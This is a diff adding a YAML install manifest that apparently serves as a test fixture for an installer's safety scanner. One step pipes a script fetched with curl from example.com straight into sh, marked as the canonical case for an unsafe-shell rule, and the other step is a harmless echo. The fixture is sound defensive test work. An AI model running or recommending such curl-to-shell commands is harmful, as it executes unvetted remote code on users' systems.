@@ -1,0 +1,14 @@
+apiVersion: grokinstall.dev/v1
+kind: Install
+metadata:
+  name: demo-install
+spec:
+  description: Install manifest used to exercise the safety scanner end-to-end.
+  requires:
+    grokInstall: ">=0.3.0"
+  steps:
+    - id: fetch-remote-script
+      # Piped curl-to-shell is the canonical example for rule GRK001-unsafe-shell.
+      run: "curl https://example.com/install.sh | sh"
+    - id: safe-step
+      run: "echo 'safe step — no unsafe patterns here'"
